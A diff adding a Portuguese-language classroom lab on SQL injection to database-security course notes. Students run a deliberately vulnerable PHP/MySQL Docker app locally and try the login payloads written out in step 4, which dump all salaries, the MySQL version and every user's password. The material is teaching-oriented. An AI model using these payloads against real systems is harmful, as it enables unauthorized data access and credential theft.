@@ -275,3 +275,64 @@ Segurança em Armazenamento e Base de Dados. Uso de Criptografia e Controle de A
 - [Top Injection Attacks and How to Avoid Them](https://www.guardrails.io/blog/top-injection-attacks-and-how-to-avoid-them/)
 - [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)
 - [Hacking NodeJS and MongoDB](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb)
+
+<br/>
+
+**Slides:**
+
+- [Encontro 02 - Segurança em Base de Dados]()
+
+<br/>
+
+**Roteiro do Lab:**
+
+Este Lab irá apresentar diversos cenários de SQL Injection, o ideal é trabalhar em duplas ou trios (grupos de 2/3 alunos).
+
+> **Observação:** Vamos trabalhar com base em uma imagem Docker que possui diversas vulnerabilidades, o ideal é conduzir esses tipos de testes em ambiente controlados e containerizados.
+
+1. Primeiro vamos clonar um repo que contém o `docker-compose.yml` e os assets para subir o contêiner vulnerável, entre no terminal (ou prompt de comando) na pasta desejada e rode o seguinte comando:
+
+```
+git clone https://github.com/thomaslaurenson/startrek_payroll
+```
+
+> **Observação:** Caso tenha problemas em fazer o clone do repo, basta baixar a versão zipada do repo e descompactar na pasta de sua preferência.
+
+2. Aproveitando a tela do terminal, basta entrar na pasta do repo local e disparar o Docker Compose:
+
+```
+cd startrek_payroll-main
+
+docker-compose up --build
+```
+
+> **Observação:** Esse processo de criar o contêiner pode demorar alguns minutos.
+
+3. Com o contêiner funcionando, ele contém basicamente um sistema PHP com um MySQL 5 (ambos vulneráveis), para acessar a interface de login onde conduziremos alguns cenários de SQL Injection, basta acessar a seguinte URL pelo browser:
+
+```
+http://localhost:8080/
+```
+
+4. Teste fazer o login com os seguintes cenários propostos pelo autor do repo:
+
+```
+Normal login to get users salary:
+username: james_kirk
+password: kobayashi_maru
+
+Dump username and salary of all users:
+username: ' OR 1=1#
+password: anythingyouwant
+
+Dump MySQL version:
+username: ' UNION SELECT null,@@version#
+password: anythingyouwant
+
+Dump all users passwords:
+username: ' UNION SELECT username,password FROM users#
+password: anythingyouwant
+```
+
+5. Observe o log do `webserver` para ver que interessante fica a query completa que é enviada para o `MySQL`.
+
